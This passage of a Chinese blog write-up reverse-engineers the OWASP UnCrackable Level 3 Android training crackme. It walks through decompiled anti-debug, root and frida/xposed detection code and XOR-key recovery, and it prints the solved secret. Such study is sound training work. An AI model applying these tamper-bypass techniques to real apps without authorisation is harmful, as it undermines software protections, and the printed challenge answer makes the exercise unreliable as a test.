class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UnCrackable3&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">tampered</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">xorkey</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;pizzapizzapizzapizzapizz&quot;</span>;<br>    <span class="hljs-keyword">private</span> CodeCheck check;<br>    Map&lt;String, Long&gt; crc;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">long</span> <span class="hljs-title function_">baz</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bArr)</span>;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: private */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showDialog</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-type">AlertDialog</span> <span class="hljs-variable">create</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.Builder(<span class="hljs-built_in">this</span>).create();<br>        create.setTitle(str);<br>        create.setMessage(<span class="hljs-string">&quot;This is unacceptable. The app is now going to exit.&quot;</span>);<br>        create.setButton(-<span class="hljs-number">3</span>, <span class="hljs-string">&quot;OK&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DialogInterface</span>.OnClickListener() &#123; <span class="hljs-comment">// from class: sg.vantagepoint.uncrackable3.MainActivity.1</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.DialogInterface.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(DialogInterface dialogInterface, <span class="hljs-type">int</span> i)</span> &#123;<br>                System.exit(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;);<br>        create.setCancelable(<span class="hljs-literal">false</span>);<br>        create.show();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">verifyLibs</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.crc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-built_in">this</span>.crc.put(<span class="hljs-string">&quot;armeabi-v7a&quot;</span>, Long.valueOf(Long.parseLong(getResources().getString(owasp.mstg.uncrackable3.R.string.armeabi_v7a))));<br>        <span class="hljs-built_in">this</span>.crc.put(<span class="hljs-string">&quot;arm64-v8a&quot;</span>, Long.valueOf(Long.parseLong(getResources().getString(owasp.mstg.uncrackable3.R.string.arm64_v8a))));<br>        <span class="hljs-built_in">this</span>.crc.put(<span class="hljs-string">&quot;x86&quot;</span>, Long.valueOf(Long.parseLong(getResources().getString(owasp.mstg.uncrackable3.R.string.x86))));<br>        <span class="hljs-built_in">this</span>.crc.put(<span class="hljs-string">&quot;x86_64&quot;</span>, Long.valueOf(Long.parseLong(getResources().getString(owasp.mstg.uncrackable3.R.string.x86_64))));<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ZipFile</span> <span class="hljs-variable">zipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(getPackageCodePath());<br>            <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Long&gt; entry : <span class="hljs-built_in">this</span>.crc.entrySet()) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;lib/&quot;</span> + entry.getKey() + <span class="hljs-string">&quot;/libfoo.so&quot;</span>;<br>                <span class="hljs-type">ZipEntry</span> <span class="hljs-variable">entry2</span> <span class="hljs-operator">=</span> zipFile.getEntry(str);<br>                Log.v(TAG, <span class="hljs-string">&quot;CRC[&quot;</span> + str + <span class="hljs-string">&quot;] = &quot;</span> + entry2.getCrc());<br>                <span class="hljs-keyword">if</span> (entry2.getCrc() != entry.getValue().longValue()) &#123;<br>                    tampered = <span class="hljs-number">31337</span>;<br>                    Log.v(TAG, str + <span class="hljs-string">&quot;: Invalid checksum = &quot;</span> + entry2.getCrc() + <span class="hljs-string">&quot;, supposed to be &quot;</span> + entry.getValue());<br>                &#125;<br>            &#125;<br>            <span class="hljs-type">ZipEntry</span> <span class="hljs-variable">entry3</span> <span class="hljs-operator">=</span> zipFile.getEntry(<span class="hljs-string">&quot;classes.dex&quot;</span>);<br>            Log.v(TAG, <span class="hljs-string">&quot;CRC[classes.dex] = &quot;</span> + entry3.getCrc());<br>            <span class="hljs-keyword">if</span> (entry3.getCrc() != baz()) &#123;<br>                tampered = <span class="hljs-number">31337</span>;<br>                Log.v(TAG, <span class="hljs-string">&quot;classes.dex: crc = &quot;</span> + entry3.getCrc() + <span class="hljs-string">&quot;, supposed to be &quot;</span> + baz());<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException unused) &#123;<br>            Log.v(TAG, <span class="hljs-string">&quot;Exception&quot;</span>);<br>            System.exit(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-comment">/* JADX WARN: Type inference failed for: r0v2, types: [sg.vantagepoint.uncrackable3.MainActivity$2] */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.SupportActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle bundle)</span> &#123;<br>        verifyLibs();<br>        init(xorkey.getBytes());<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncTask</span>&lt;Void, String, String&gt;() &#123; <span class="hljs-comment">// from class: sg.vantagepoint.uncrackable3.MainActivity.2</span><br>            <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.os.AsyncTask</span><br>            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">doInBackground</span><span class="hljs-params">(Void... voidArr)</span> &#123;<br>                <span class="hljs-keyword">while</span> (!Debug.isDebuggerConnected()) &#123;<br>                    SystemClock.sleep(<span class="hljs-number">100L</span>);<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br><br>            <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.os.AsyncTask</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onPostExecute</span><span class="hljs-params">(String str)</span> &#123;<br>                MainActivity.<span class="hljs-built_in">this</span>.showDialog(<span class="hljs-string">&quot;Debugger detected!&quot;</span>);<br>                System.exit(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;.execute(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">if</span> (RootDetection.checkRoot1() || RootDetection.checkRoot2() || RootDetection.checkRoot3() || IntegrityCheck.isDebuggable(getApplicationContext()) || tampered != <span class="hljs-number">0</span>) &#123;<br>            showDialog(<span class="hljs-string">&quot;Rooting or tampering detected.&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.check = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodeCheck</span>();<br>        <span class="hljs-built_in">super</span>.onCreate(bundle);<br>        setContentView(owasp.mstg.uncrackable3.R.layout.activity_main);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(View view)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ((EditText) findViewById(owasp.mstg.uncrackable3.R.id.edit_text)).getText().toString();<br>        <span class="hljs-type">AlertDialog</span> <span class="hljs-variable">create</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.Builder(<span class="hljs-built_in">this</span>).create();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.check.check_code(obj)) &#123;<br>            create.setTitle(<span class="hljs-string">&quot;Success!&quot;</span>);<br>            create.setMessage(<span class="hljs-string">&quot;This is the correct secret.&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            create.setTitle(<span class="hljs-string">&quot;Nope...&quot;</span>);<br>            create.setMessage(<span class="hljs-string">&quot;That&#x27;s not it. Try again.&quot;</span>);<br>        &#125;<br>        create.setButton(-<span class="hljs-number">3</span>, <span class="hljs-string">&quot;OK&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DialogInterface</span>.OnClickListener() &#123; <span class="hljs-comment">// from class: sg.vantagepoint.uncrackable3.MainActivity.3</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.DialogInterface.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(DialogInterface dialogInterface, <span class="hljs-type">int</span> i)</span> &#123;<br>                dialogInterface.dismiss();<br>            &#125;<br>        &#125;);<br>        create.show();<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;foo&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先检查各种版本的so，使用crc校验，随后将xorkey传入本地init方法进行初始化，然后创建异步任务检测是否处于debug状态，然后检测是否root。</p><p>verify方法主要逻辑是调用check_code方法去验证输入的secret是否正确。</p><h4 id="CodeCheck-1"><a href="#CodeCheck-1" class="headerlink" title="CodeCheck"></a>CodeCheck</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sg.vantagepoint.uncrackable3;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeCheck</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CodeCheck&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">bar</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bArr)</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">check_code</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">return</span> bar(str.getBytes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>校验secret的逻辑，调用了本地的bar方法，bar方法的IDA反汇编逻辑如下（32位）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> __cdecl <span class="hljs-title function_">Java_sg_vantagepoint_uncrackable3_CodeCheck_bar</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> *i; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">bool</span> v7; <span class="hljs-comment">// zf</span><br>  <span class="hljs-type">char</span> result; <span class="hljs-comment">// al</span><br>  __int128 v9; <span class="hljs-comment">// [esp+0h] [ebp-3Ch] BYREF</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+10h] [ebp-2Ch]</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [esp+14h] [ebp-28h]</span><br>  <span class="hljs-type">char</span> v12; <span class="hljs-comment">// [esp+18h] [ebp-24h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [esp+28h] [ebp-14h]</span><br><br>  v13 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  v9 = <span class="hljs-number">0LL</span>;<br>  v11 = <span class="hljs-number">0</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  v12 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( dword_6038 == <span class="hljs-number">2</span> )<br>  &#123;<br>    sub_FA0((<span class="hljs-type">int</span>)&amp;v9);<br>    v4 = (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="hljs-number">736</span>))(a1, a3, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>))(*(_DWORD *)a1 + <span class="hljs-number">684</span>))(a1, a3) == <span class="hljs-number">24</span> )<br>    &#123;<br>      v5 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> ( i = &amp;dword_601C; *(_BYTE *)(v4 + v5) == (*((_BYTE *)&amp;v9 + v5) ^ *(_BYTE *)i); i = (<span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)i + <span class="hljs-number">1</span>) )<br>      &#123;<br>        v7 = ++v5 == <span class="hljs-number">24</span>;<br>        <span class="hljs-keyword">if</span> ( v5 &gt;= <span class="hljs-number">0x18</span> )<br>        &#123;<br>          result = <span class="hljs-number">1</span>;<br>          <span class="hljs-keyword">if</span> ( v7 )<br>            <span class="hljs-keyword">return</span> result;<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>后面我们着重对上述反汇编代码进行分析。</p><p>首先校验dword_6038的值是不是2，如果不是2证明初始化过程存在绕过或者错误，init函数以及验证环境中是否存在frida或者xposed关键字的子线程中都存在++dword_6038：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">sub_3080</span><span class="hljs-params">()</span><br>&#123;<br>  FILE *v0; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">528</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-210h] BYREF</span><br><br>  v0 = fopen(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v0 )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      <span class="hljs-keyword">while</span> ( !fgets(s, <span class="hljs-number">512</span>, v0) )<br>      &#123;<br>        fclose(v0);<br>        usleep(<span class="hljs-number">0x1F4</span>u);<br>        v0 = fopen(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-keyword">if</span> ( !v0 )<br>          <span class="hljs-keyword">goto</span> LABEL_7;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( !<span class="hljs-built_in">strstr</span>(s, <span class="hljs-string">&quot;frida&quot;</span>) &amp;&amp; !<span class="hljs-built_in">strstr</span>(s, <span class="hljs-string">&quot;xposed&quot;</span>) );<br>    v1 = <span class="hljs-string">&quot;Tampering detected! Terminating...&quot;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>LABEL_7:<br>    v1 = <span class="hljs-string">&quot;Error opening /proc/self/maps! Terminating...&quot;</span>;<br>  &#125;<br>  __android_log_print(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;UnCrackable3&quot;</span>, v1);<br>  goodbye();<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sub_3180</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> newthread[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-18h] BYREF</span><br><br>  newthread[<span class="hljs-number">1</span>] = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  pthread_create((<span class="hljs-type">pthread_t</span> *)newthread, <span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *(*)(<span class="hljs-type">void</span> *))sub_3080, <span class="hljs-number">0</span>); <span class="hljs-comment">//创建sub_3080函数的子线程，该线程用于检测/proc/self/maps中是否存在frida或者xposed关键字</span><br>  dword_6020 = <span class="hljs-number">0</span>;<br>  dword_601C = <span class="hljs-number">0</span>;<br>  dword_6028 = <span class="hljs-number">0</span>;<br>  dword_6024 = <span class="hljs-number">0</span>;<br>  byte_6034 = <span class="hljs-number">0</span>;<br>  dword_6030 = <span class="hljs-number">0</span>;<br>  dword_602C = <span class="hljs-number">0</span>;<br>  ++dword_6038; <span class="hljs-comment">//初始化检测线程的验证</span><br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u);<br>&#125;<br><br><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">Java_sg_vantagepoint_uncrackable3_MainActivity_init</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  sub_3250();<br>  v4 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="hljs-number">736</span>))(a1, a3, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">strncpy</span>((<span class="hljs-type">char</span> *)&amp;dword_601C, v4, <span class="hljs-number">0x18</span>u);<br>  result = (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">int</span>))(*(_DWORD *)a1 + <span class="hljs-number">768</span>))(a1, a3, v4, <span class="hljs-number">2</span>);<br>  ++dword_6038; <span class="hljs-comment">//初始化的验证</span><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>随后调用sub_FA0对另一个异或的key进行初始化，我们进入这个函数发现有两千多行的伪代码，实际对入参操作的只有最后一段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">_DWORD *__cdecl <span class="hljs-title function_">sub_FA0</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br><span class="hljs-comment">// ...省略前2000+行</span><br>LABEL_501:<br>  *(_DWORD *)off_5FA0 = result;<br>  <span class="hljs-keyword">if</span> ( result )<br>  &#123;<br>    result = (_DWORD *)a1;<br>    *(_DWORD *)(a1 + <span class="hljs-number">4</span>) = <span class="hljs-number">0</span>;<br>    *(_DWORD *)a1 = <span class="hljs-number">0</span>;<br>    *(_DWORD *)(a1 + <span class="hljs-number">12</span>) = <span class="hljs-number">0</span>;<br>    *(_DWORD *)(a1 + <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;<br>    *(_BYTE *)(a1 + <span class="hljs-number">24</span>) = <span class="hljs-number">0</span>;<br>    *(_OWORD *)a1 = xmmword_3480; <span class="hljs-comment">// xmmword_3480 xmmword 15131D5A1903000D1549170F1311081Dh</span><br>    *(_DWORD *)(a1 + <span class="hljs-number">16</span>) = <span class="hljs-number">0x005A0E08</span>;<br>    *(_DWORD *)(a1 + <span class="hljs-number">20</span>) = <span class="hljs-number">0x14130817</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>后面初始化一下用户输入的值a3的字符串长度是否为24，不是24直接返回（secret的长度为24）。</p><p>后面进入了最重要的逻辑，一个for循环：<code>for ( i = &amp;dword_601C; *(_BYTE *)(v4 + v5) == (*((_BYTE *)&amp;v9 + v5) ^ *(_BYTE *)i); i = (int *)((char *)i + 1) )</code></p><p>初始化的时候调用了<code>strncpy((char *)&amp;dword_601C, v4, 0x18u);</code>因此合理推测，dword_601C中存储的是xorkey也就是”pizzapizzapizzapizzapizz”；异或操作的另一个值v9就是sub_FA0中初始化的a1的值。</p><p>其实到这里我们已经知道了大概的逻辑，将用户的输入与”pizzapizzapizzapizzapizz”和v9的异或结果比较（其中v9的前16个8bit组为0x15131D5A1903000D1549170F1311081D，紧接着4个8bit组为0x005A0E08，最后4个0x14130817，由于x86架构下数据存储为小端序，即低地址为低位，那么v9的值就是<code>1D 08 11 13 0F 17 49 15 0D 00 03 19 5A 1D 13 15 08 0E 5A 00 17 08 13 14</code>），如果24个值比较完成都一致就返回1表示校验成功，否则返回0表示secret错误。两个异或的key我们都得到了，便可以直接静态分析出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">otherkey = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1D 08 11 13 0F 17 49 15 0D 00 03 19 5A 1D 13 15 08 0E 5A 00 17 08 13 14&quot;</span>)<br>pizza = <span class="hljs-string">b&#x27;pizzapizzapizzapizzapizz&#x27;</span><br>secret = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> (a, b) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(pizza, otherkey))<br><span class="hljs-built_in">print</span>(secret)<br></code></pre></td></tr></table></figure><p>结果为：<code>b&#39;making owasp great again&#39;</code></p><h4 id="IntegrityCheck"><a href="#IntegrityCheck" class="headerlink" title="IntegrityCheck"></a>IntegrityCheck</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sg.vantagepoint.util;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IntegrityCheck</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDebuggable</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">return</span> (context.getApplicationContext().getApplicationInfo().flags &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟前面一样，检测是否为debug模式</p><h4 id="RootDetection"><a href="#RootDetection" class="headerlink" title="RootDetection"></a>RootDetection</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sg.vantagepoint.util;<br><br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RootDetection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkRoot1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (String str : System.getenv(<span class="hljs-string">&quot;PATH&quot;</span>).split(<span class="hljs-string">&quot;:&quot;</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(str, <span class="hljs-string">&quot;su&quot;</span>).exists()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkRoot2</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> Build.TAGS;<br>        <span class="hljs-keyword">return</span> str != <span class="hljs-literal">null</span> &amp;&amp; str.contains(<span class="hljs-string">&quot;test-keys&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkRoot3</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (String str : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/system/app/Superuser.apk&quot;</span>, <span class="hljs-string">&quot;/system/xbin/daemonsu&quot;</span>, <span class="hljs-string">&quot;/system/etc/init.d/99SuperSUDaemon&quot;</span>, <span class="hljs-string">&quot;/system/bin/.ext/.su&quot;</span>, 